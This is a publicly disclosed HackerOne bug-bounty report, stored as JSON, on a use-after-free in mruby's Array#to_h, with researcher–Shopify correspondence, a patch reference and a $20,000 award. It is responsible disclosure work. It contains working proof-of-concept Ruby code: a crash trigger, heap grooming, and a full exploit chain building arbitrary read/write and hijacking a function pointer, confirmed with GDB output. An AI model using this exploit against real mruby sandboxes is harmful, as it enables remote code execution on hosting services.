@@ -1,0 +1,374 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2016-12-16T20:05:00.029Z", 
+    "voters": [
+        "isra17", 
+        "dkasak", 
+        "michiel", 
+        "bl4de", 
+        "bogdantcaciuc", 
+        "mdv", 
+        "eveeez", 
+        "axolotl", 
+        "mpz", 
+        "ak1t4", 
+        "and 19 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "20000.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 181321, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2016-12-16T19:46:22.718Z", 
+    "vulnerability_information": "This bug was found with `jmlb337`.\n\n## Vulnerability \nThe function `to_h` will call the C function  `mrb_ary_to_h`.  This will iterate through the elements of the array.  If an element is not of type Array it will call attempt to call `to_ary` method of that object.  If `to_ary` does not return an array, the function will raise a ruby exception with the class name in the exception message.\n\nHowever, the code does not properly check that the array length was not modified during the call of `to_ary`. The vulnerability is triggered when the array is shrunk during call to `to_ary`, letting `mrb_ary_to_h` read an out of bound object to get an element classname.  A crash or or denial of service can be triggered by neutering the array in the `to_ary` call. A `mrb_obj_iv_set` call done on the controlled class pointer can be used to have a memory write leading to RCE.\n\n\n## Reproduction Step\n1. Define a new class that will define the method `to_ary`.\n2. in the `to_ary` clear a global array that will be later define and return a non array object.\n3. Create the global array containing an instance of the defined class.\n4. Call `to_h` on that array.\n\n## PoC DOS\n```ruby\nclass A\n  def to_ary\n    $a.clear\n    nil\n  end\nend\n$a = [A.new]\n$a.to_h\n```\nThis POC will cause a null memory access and terminate the mruby process.\n\n## Explaination\nThe bug is triggered due to call back to `to_ary` in [array.c:130](https://github.com/mruby/mruby/blob/master/mrbgems/mruby-array-ext/src/array.c#L130): \n```c\n v = mrb_check_array_type(mrb, RARRAY_PTR(ary)[i]);\n```\n\nThe function `mrb_check_array_type` check if the element at `RARRAY_PTR(ary)[i]`.  in the case of the POC it will be of type `A`.  It will then continue to call the `to_ary` method of the `A` class to convert the value into an array.\n\n```c\nMRB_API mrb_value\nmrb_check_array_type(mrb_state *mrb, mrb_value ary)\n{\n  return mrb_check_convert_type(mrb, ary, MRB_TT_ARRAY, \"Array\", \"to_ary\");\n}\n\nMRB_API mrb_value\nmrb_check_convert_type(mrb_state *mrb, mrb_value val, enum mrb_vtype type, const char *tname, const char *method)\n{\n  mrb_value v;\n\n  if (mrb_type(val) == type && type != MRB_TT_DATA) return val;\n  v = convert_type(mrb, val, tname, method, FALSE);\n  if (mrb_nil_p(v) || mrb_type(v) != type) return mrb_nil_value();\n  return v;\n}\n```\n\nBy calling the `Array#clear` method on the global array, the pointer to the array data (`ptr`) will be set to null.\n```c\nMRB_API mrb_value\nmrb_ary_clear(mrb_state *mrb, mrb_value self)\n{\n...\n  a->len = 0;\n  a->aux.capa = 0;\n  a->ptr = 0;\n...\n```\n\nSince `to_ary` will not return an array, the C code will attempt to raise an exception with the class name in the exception message.\n```c\n if (mrb_nil_p(v)) {\n      mrb_raisef(mrb, E_TYPE_ERROR, \"wrong element type %S at %S (expected array)\",\n        mrb_str_new_cstr(mrb,  mrb_obj_classname(mrb, RARRAY_PTR(ary)[i])),\n```\nwhen it calls `RARRAY_PTR(ary)[i]` it will attempt to reference `0[i]` and crash the process.\n\n## Exploitability\n\nThe vulnerability is exploitable as long as the attacker can run arbitrary ruby code in the mruby interpreter. It should cover mruby-engine case as used by Shopify.\n\n## Impact\n\nThis vulnerability can cause a Denial Of service on the mruby process very reliably.  It could also lead to farther memory corruption and potentially lead to Remote Code Execution.\n\nWe are convinced we can push this bug further to lead to memory corruption and RCE. I spoke with Fran\u00e7ois Chagnon and we preferred to report the bugs as soon as possible while working on a complete proof of concept afterward so it can get patched earlier. Therefor we would like a week or two to get time to work on this and be able to claim the higher tier bounty. The proof of concept would also used the other reported bug [#181319](https://hackerone.com/reports/181319) to get a memory disclosure.\n\n## Possible Remote Code Execution POC #2\n```ruby\n$size = 32\n$bb = []\nfor i in 0..256\n $bb.push(\"b\"*$size)\nend\n\nclass A\n def to_ary\n   $bb.clear\n   $a.clear\n   $a.push(\"b\"*256)\n   #first byte is 0 as long as the lsb != 1 its fine\n   $a.push(\"\\x00bcdefg\\x70hijklmnopqurtuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY\"*3 + (\"a\"*200))\n   $a.push(\"y\"*256)\n   $a.push(\"e\"*256)\n\n   return \"a\"\n end\nend\n\n$a = [[1,\"a\"],[1,\"a\"],[1,\"a\"],[1,\"a\"],[1,\"a\"],[1,\"a\"],A.new]\n\nfor i in 0..256\n $bb.push(\"z\"*$size)\nend\n\n@a = $a.to_h\n```\n\n## Exploitation\nIn the second POC, and attacker creates an array of 7 elements where the last element has an object with the vulnerable to_ary method.  7 elements is important because when the bug is triggered the index of the array will be out of bounds by 3 pointer size.  That is where our data will be.\n\nafter clearing the global array push some elements back into the array. No more than 4 since that will increase the capacity of the array to 8 and our index will not be out of bounds.\n\nby pushing the large strings the data of the strings will be placed after the array data.  When the call is made to `mrb_obj_classname(mrb, RARRAY_PTR(ary)[i])`,\nuser controlled data will be returned.  \n\nAn attacker could then craft an `mrb_value` object using the strings and cause farther memory corruption.\n\nThere exists code paths that could allow an attacker to right data to a pointer crafted by the attacker.\n\n## Proposed Fix\n\nSee patch in attachment.\n", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "critical", 
+        "author_type": "User"
+    }, 
+    "title": "Use after free vulnerability in mruby Array#to_h causing DOS possible RCE", 
+    "is_member_of_team?": null, 
+    "vote_count": 29, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-01-15T19:46:22.752Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$20,000", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/133/846/0822712d3690e8d276be77a42a9e3685dfe4bfad/0001-Fix-out-of-bound-access-in-Array-to_h.patch?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224555Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a8b90bc14f254d66cffaa30a08c8f7c84fcdadc518f331d160e4839d5c88f9af", 
+                    "type": "text/x-diff", 
+                    "id": 133846, 
+                    "filename": "0001-Fix-out-of-bound-access-in-Array-to_h.patch"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2016-11-10T13:19:38.955Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-10T13:19:38.955Z", 
+            "actor": {
+                "username": "isra17", 
+                "url": "/isra17", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Forgot the patch.", 
+            "markdown_message": "<p>Forgot the patch.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1293228, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-11-10T15:53:12.273Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-10T15:53:12.273Z", 
+            "actor": {
+                "username": "francoischagnon", 
+                "url": "/francoischagnon", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/168/3b5130025fbf90eaeb1c9234baa340dfead68f44_medium.jpg?1429126005"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "@isra17 since we may end up using the patch you submitted (or parts of it) I just want to confirm in writing that you agree to release it under the original project license (MIT License). We'll attribute the patches to you by linking to this issue and your github account if you wish.", 
+            "markdown_message": "<p><a href=\"/isra17\">@isra17</a> since we may end up using the patch you submitted (or parts of it) I just want to confirm in writing that you agree to release it under the original project license (MIT License). We&#39;ll attribute the patches to you by linking to this issue and your github account if you wish.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1293516, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-11-10T16:01:42.673Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-10T16:01:42.673Z", 
+            "actor": {
+                "username": "isra17", 
+                "url": "/isra17", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "I agree to release it under the original project license.", 
+            "markdown_message": "<p>I agree to release it under the original project license.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1293538, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-11-14T19:01:15.687Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-14T19:01:15.687Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thank you for your report. We've reproduced the issue, and our engineering team is working on a fix.", 
+            "markdown_message": "<p>Thank you for your report. We&#39;ve reproduced the issue, and our engineering team is working on a fix.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 1298888, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "isra17", 
+                "url": "/isra17"
+            }, 
+            "created_at": "2016-11-15T20:18:30.269Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-15T20:18:30.269Z", 
+            "actor": {
+                "username": "francoischagnon", 
+                "url": "/francoischagnon", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/168/3b5130025fbf90eaeb1c9234baa340dfead68f44_medium.jpg?1429126005"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thank you again for this great report. We've resolved this issue in our production environment and the fix has been submitted upstream: https://github.com/mruby/mruby/commit/739dad6e87e91c74cda794ae3f33cd94a7c33eb1\n\nI'm marking this issue as resolved now but we still need to assess the impact &  determine a final bounty amount. This may take a few weeks since we received a large number of valid issues and we want to calibrate our payouts across all of them.", 
+            "markdown_message": "<p>Thank you again for this great report. We&#39;ve resolved this issue in our production environment and the fix has been submitted upstream: <a title=\"https://github.com/mruby/mruby/commit/739dad6e87e91c74cda794ae3f33cd94a7c33eb1\" href=\"/redirect?signature=1e6e7a70e318a696c21d2fbc22f4435f87b25242&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2F739dad6e87e91c74cda794ae3f33cd94a7c33eb1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/commit/739dad6e87e91c74cda794ae3f33cd94a7c33eb1</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>I&#39;m marking this issue as resolved now but we still need to assess the impact &amp;  determine a final bounty amount. This may take a few weeks since we received a large number of valid issues and we want to calibrate our payouts across all of them.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1301031, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-11-23T03:07:41.458Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-23T03:07:41.458Z", 
+            "actor": {
+                "username": "isra17", 
+                "url": "/isra17", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Finally, here's RCE PoC using both the String#lines and Array#to_h bugs:\n\n```ruby\n# Helper functions\ndef puts *_;end\n# Convert a Integer to bytes in little-endian\ndef pack(n)\n  p = \"\\x00\"*8\n  8.times do |i|\n    b = n% 256\n    p.setbyte(i,b)\n    n = n/256\n  end\n  return p\nend\n\n# Convert a string in little-endian to an Integer\ndef unpack(p)\n  n = 0\n  8.times do |i|\n    n += p.getbyte(i) * (256**i)\n  end\n  return n\nend\n\n# Convert a byte array little-endian to an Integer\ndef unpack_a(p)\n  n = Integer(0)\n  p.length.times do |i|\n    n += p[i] * (256**i)\n  end\n  return n\nend\n\n# Write a string into another\ndef write(s, b, o=0)\n  b.bytesize.times{|i|s.setbyte(o+i, b.getbyte(i))}\nend\n\n# Clean the Heap\nGC.start\n\n# Set up the exploit vars\n@a = []\n$a = Array.new 1024\n$b = nil\nplaceholder = \"a\" * (1024*48+6*8-1)\n$lines = placeholder * 1\n$lines[0] = \"\\n\"\n$leak = \"\"\nGC.start\n\n# Leak a garbage collector chunk that contains mbr_object, leaking\n# a known RString structure and its ->ptr value.\n$state = 0\n$lines.lines do |l|\n  if $state == 0\n    #puts '[*] Freeing $lines'\n    $lines.clear\n    #puts \"[*] Start GC\"\n    GC.start\n    GC.disable\n    # Create var to force GC to allocate a new mbr_object chunk.\n    1024.times{$b = \"a\"*1}\n    $c = \"\"\n    $str = \"X\" * 0xff\n    # Keep a sentinel to easily retrieve $str. Also used later for Read/Write primitive.\n    $b = \"\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\"\n    $state=1\n  else\n    $leak += l\n  end\nend\n\n\n@a << $leak.bytesize.to_s(16)\n# String#index is buggy, so fallback to Array#index\n# Might be also buggy.\nleak = $leak.bytes\ncan_i = 0\ncan_i = leak.index(0xfe)\n@a<<can_i\n\n# This is the leaked RString.\nstr_obj = leak[can_i+24..can_i+24+47]\n\n# Leaked RString->ptr value.\n$str_ptr = unpack_a(str_obj[-8..-1])\n# Leaked RString address.\n$str_addr=($str.object_id^0x10)\n#puts \"[*] str: #{$str.object_id^0x10}\"\n#puts \"[*] str->ptr: #{$str_ptr}\"\n\n# Now use the Array#to_h use-after-free exploit.\nclass A\n  def to_ary\n    #puts \"[*] to_ary\"\n    # Free the Array.\n    $uaf.clear\n    # Create a smaller array that will be allocated at the same spot.\n    $uaf.replace $new_array\n    $new_array.clear\n\n    # Allocate the string right after the Array. The string will be used by #to_h as an\n    # element from the Array. The crafted element has a buggy class pointer used\n    # to throw an exception by #to_h. The buggy class pointer allow us to write an\n    # arbitrary pointer value anywhere (To an RString->len in our case).\n    $a = \"A\"*(0x40*8)\n  \n    # &str->ptr[0]\n    write($a, pack($str_ptr), 0)\n    #  0x0: tt Not used\n    #  0x8: c = &EKlass\n    write($str, pack($str_ptr+0x30), 8)\n\n    # &Klass [0x30]:\n    # 0x00: tt = 9\n    # 0x08: c, Not used\n    # 0x10: gc, Not used\n    # 0x18: iv -> &IvTable\n    write($str, pack($str_ptr+0x60),0x30+0x18)\n                # &IVTable [0x60]:\n    # 0x00: n_buckets\n    write($str, pack(0x4), 0x60)\n    # 0x04: size\n    # 0x08: n_occupied\n    write($str, pack(0x1), 0x60 + 8)\n    # 0x10: ed_flags = [Occupied, Empty]\n    write($str, pack($str_ptr+0x90),0x60+0x10)\n    # 0x18: keys = [H(:__classid__), 0]\n    write($str, pack($str_ptr+0x90+4),0x60+0x18)\n    # 0x20: vals = [!0, (str->len)]\n    write($str, pack($str_addr + 24-8),0x60+0x20)\n\n    #write($str, pack(0x1),48+48+4)\n    write($str, \"\\x08\\x08\\x20\\x80\",48+48+48)\n    # key items\n    write($str, \"\\x06\\x00\\x00\\x00\",48+48+48+4)\n    write($str, \"\\x06\\x00\\x00\\x00\",48+48+48+8)\n    write($str, \"\\x06\\x00\\x00\\x00\",48+48+48+12)\n    write($str, \"\\x06\\x00\\x00\\x00\",48+48+48+16)\n\n    #puts \"[*] Done\"\n    nil\n  end\nend\n\n#puts \"[*] Alloc array\"\n# Fill the holes\n300.times{$a = \"C\"*(0x100-1)}\n100.times{$a = \"C\"*(0x200-1)}\n# Create the array that will trigger the UAF\n$uaf = Array.new 68\n$uaf_len = Integer($uaf.length/2)\n$new_array = Array.new(0x40)\n$uaf.length.times{|i|$uaf[i] = [0,0]}\n$uaf[-2] = A.new\n\n#puts \"[*] to_h Exploit\"\nbegin\n        $uaf.to_h\nensure\n  # $str is now corrupted with a big length. Warning: Do not use regular\n  # string function or else: Crash. Bytes function (setbyte/getbyte/bytesize work well\n  # with corrupted strings).\n\n  # luckily the $str->ptr is before the $str and $b RString :). We use this occasion\n  # to rewrite $b RString.\n  $off = $str_addr - $str_ptr - 48\n  # Remove the RSTRING_EMBED flag from $b.\n  $str.setbyte($off+1, 0)\n  $str.setbyte($off+2, 0)\n  # Set the $b length at 0xffffffff\n  write($str, pack(0xffffffff), $off+24)\n\n  # Set $b->ptr\n  def set_ptr(p)\n    write($str, pack(p), $off+40)\n  end\n\n  # Read anywhere\n  def r(addr, n)\n    set_ptr(addr)\n    b = []\n    n.times {|i| b << $b.getbyte(i)}\n    return b\n  end\n\n  # Write anywhere\n  def w(addr, data)\n    set_ptr(addr)\n    data.bytesize.times {|i| $b.setbyte(i, data.getbyte(i))}\n  end\n\n  # Create Proc object.\n  code = Proc.new{}\n  code_addr = code.object_id ^ 13\n  # Set the function to target.\n  w(code_addr + 2, \"\\x0c\")\n  w(code_addr + 24, 'AAAAAAAA')\n\n  # Win!\n  code.call\nend\n```\n\nResult from GDB\n```\n0x00007f5c5bc8153b in mrb_vm_exec (mrb=mrb@entry=0x1f00000004e0,\n    proc=<optimized out>, proc@entry=0x1f000011b320, pc=<optimized out>)\n    at /home/isra/devel/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1235\n1235            recv = m->body.func(mrb, recv);\n(gdb) x m->body.func\n0x4141414141414141:     Cannot access memory at address 0x4141414141414141\n(gdb)\n```", 
+            "markdown_message": "<p>Finally, here&#39;s RCE PoC using both the String#lines and Array#to_h bugs:</p>\n<pre class=\"highlight ruby\"><code><span class=\"c1\"># Helper functions</span>\n<span class=\"k\">def</span> <span class=\"nf\">puts</span> <span class=\"o\">*</span><span class=\"n\">_</span><span class=\"p\">;</span><span class=\"k\">end</span>\n<span class=\"c1\"># Convert a Integer to bytes in little-endian</span>\n<span class=\"k\">def</span> <span class=\"nf\">pack</span><span class=\"p\">(</span><span class=\"n\">n</span><span class=\"p\">)</span>\n  <span class=\"nb\">p</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;</span><span class=\"se\">\\x00</span><span class=\"s2\">&quot;</span><span class=\"o\">*</span><span class=\"mi\">8</span>\n  <span class=\"mi\">8</span><span class=\"p\">.</span><span class=\"nf\">times</span> <span class=\"k\">do</span> <span class=\"o\">|</span><span class=\"n\">i</span><span class=\"o\">|</span>\n    <span class=\"n\">b</span> <span class=\"o\">=</span> <span class=\"n\">n</span><span class=\"o\">%</span> <span class=\"mi\">256</span>\n    <span class=\"nb\">p</span><span class=\"p\">.</span><span class=\"nf\">setbyte</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">,</span><span class=\"n\">b</span><span class=\"p\">)</span>\n    <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">n</span><span class=\"o\">/</span><span class=\"mi\">256</span>\n  <span class=\"k\">end</span>\n  <span class=\"k\">return</span> <span class=\"nb\">p</span>\n<span class=\"k\">end</span>\n\n<span class=\"c1\"># Convert a string in little-endian to an Integer</span>\n<span class=\"k\">def</span> <span class=\"nf\">unpack</span><span class=\"p\">(</span><span class=\"nb\">p</span><span class=\"p\">)</span>\n  <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n  <span class=\"mi\">8</span><span class=\"p\">.</span><span class=\"nf\">times</span> <span class=\"k\">do</span> <span class=\"o\">|</span><span class=\"n\">i</span><span class=\"o\">|</span>\n    <span class=\"n\">n</span> <span class=\"o\">+=</span> <span class=\"nb\">p</span><span class=\"p\">.</span><span class=\"nf\">getbyte</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">)</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">256</span><span class=\"o\">**</span><span class=\"n\">i</span><span class=\"p\">)</span>\n  <span class=\"k\">end</span>\n  <span class=\"k\">return</span> <span class=\"n\">n</span>\n<span class=\"k\">end</span>\n\n<span class=\"c1\"># Convert a byte array little-endian to an Integer</span>\n<span class=\"k\">def</span> <span class=\"nf\">unpack_a</span><span class=\"p\">(</span><span class=\"nb\">p</span><span class=\"p\">)</span>\n  <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"no\">Integer</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n  <span class=\"nb\">p</span><span class=\"p\">.</span><span class=\"nf\">length</span><span class=\"p\">.</span><span class=\"nf\">times</span> <span class=\"k\">do</span> <span class=\"o\">|</span><span class=\"n\">i</span><span class=\"o\">|</span>\n    <span class=\"n\">n</span> <span class=\"o\">+=</span> <span class=\"nb\">p</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">256</span><span class=\"o\">**</span><span class=\"n\">i</span><span class=\"p\">)</span>\n  <span class=\"k\">end</span>\n  <span class=\"k\">return</span> <span class=\"n\">n</span>\n<span class=\"k\">end</span>\n\n<span class=\"c1\"># Write a string into another</span>\n<span class=\"k\">def</span> <span class=\"nf\">write</span><span class=\"p\">(</span><span class=\"n\">s</span><span class=\"p\">,</span> <span class=\"n\">b</span><span class=\"p\">,</span> <span class=\"n\">o</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n  <span class=\"n\">b</span><span class=\"p\">.</span><span class=\"nf\">bytesize</span><span class=\"p\">.</span><span class=\"nf\">times</span><span class=\"p\">{</span><span class=\"o\">|</span><span class=\"n\">i</span><span class=\"o\">|</span><span class=\"n\">s</span><span class=\"p\">.</span><span class=\"nf\">setbyte</span><span class=\"p\">(</span><span class=\"n\">o</span><span class=\"o\">+</span><span class=\"n\">i</span><span class=\"p\">,</span> <span class=\"n\">b</span><span class=\"p\">.</span><span class=\"nf\">getbyte</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">))}</span>\n<span class=\"k\">end</span>\n\n<span class=\"c1\"># Clean the Heap</span>\n<span class=\"no\">GC</span><span class=\"p\">.</span><span class=\"nf\">start</span>\n\n<span class=\"c1\"># Set up the exploit vars</span>\n<span class=\"vi\">@a</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n<span class=\"vg\">$a</span> <span class=\"o\">=</span> <span class=\"no\">Array</span><span class=\"p\">.</span><span class=\"nf\">new</span> <span class=\"mi\">1024</span>\n<span class=\"vg\">$b</span> <span class=\"o\">=</span> <span class=\"kp\">nil</span>\n<span class=\"n\">placeholder</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;a&quot;</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">1024</span><span class=\"o\">*</span><span class=\"mi\">48</span><span class=\"o\">+</span><span class=\"mi\">6</span><span class=\"o\">*</span><span class=\"mi\">8</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">)</span>\n<span class=\"vg\">$lines</span> <span class=\"o\">=</span> <span class=\"n\">placeholder</span> <span class=\"o\">*</span> <span class=\"mi\">1</span>\n<span class=\"vg\">$lines</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;</span><span class=\"se\">\\n</span><span class=\"s2\">&quot;</span>\n<span class=\"vg\">$leak</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;&quot;</span>\n<span class=\"no\">GC</span><span class=\"p\">.</span><span class=\"nf\">start</span>\n\n<span class=\"c1\"># Leak a garbage collector chunk that contains mbr_object, leaking</span>\n<span class=\"c1\"># a known RString structure and its -&gt;ptr value.</span>\n<span class=\"vg\">$state</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n<span class=\"vg\">$lines</span><span class=\"p\">.</span><span class=\"nf\">lines</span> <span class=\"k\">do</span> <span class=\"o\">|</span><span class=\"n\">l</span><span class=\"o\">|</span>\n  <span class=\"k\">if</span> <span class=\"vg\">$state</span> <span class=\"o\">==</span> <span class=\"mi\">0</span>\n    <span class=\"c1\">#puts &#39;[*] Freeing $lines&#39;</span>\n    <span class=\"vg\">$lines</span><span class=\"p\">.</span><span class=\"nf\">clear</span>\n    <span class=\"c1\">#puts &quot;[*] Start GC&quot;</span>\n    <span class=\"no\">GC</span><span class=\"p\">.</span><span class=\"nf\">start</span>\n    <span class=\"no\">GC</span><span class=\"p\">.</span><span class=\"nf\">disable</span>\n    <span class=\"c1\"># Create var to force GC to allocate a new mbr_object chunk.</span>\n    <span class=\"mi\">1024</span><span class=\"p\">.</span><span class=\"nf\">times</span><span class=\"p\">{</span><span class=\"vg\">$b</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;a&quot;</span><span class=\"o\">*</span><span class=\"mi\">1</span><span class=\"p\">}</span>\n    <span class=\"vg\">$c</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;&quot;</span>\n    <span class=\"vg\">$str</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;X&quot;</span> <span class=\"o\">*</span> <span class=\"mh\">0xff</span>\n    <span class=\"c1\"># Keep a sentinel to easily retrieve $str. Also used later for Read/Write primitive.</span>\n    <span class=\"vg\">$b</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;</span><span class=\"se\">\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE</span><span class=\"s2\">&quot;</span>\n    <span class=\"vg\">$state</span><span class=\"o\">=</span><span class=\"mi\">1</span>\n  <span class=\"k\">else</span>\n    <span class=\"vg\">$leak</span> <span class=\"o\">+=</span> <span class=\"n\">l</span>\n  <span class=\"k\">end</span>\n<span class=\"k\">end</span>\n\n\n<span class=\"vi\">@a</span> <span class=\"o\">&lt;&lt;</span> <span class=\"vg\">$leak</span><span class=\"p\">.</span><span class=\"nf\">bytesize</span><span class=\"p\">.</span><span class=\"nf\">to_s</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>\n<span class=\"c1\"># String#index is buggy, so fallback to Array#index</span>\n<span class=\"c1\"># Might be also buggy.</span>\n<span class=\"n\">leak</span> <span class=\"o\">=</span> <span class=\"vg\">$leak</span><span class=\"p\">.</span><span class=\"nf\">bytes</span>\n<span class=\"n\">can_i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n<span class=\"n\">can_i</span> <span class=\"o\">=</span> <span class=\"n\">leak</span><span 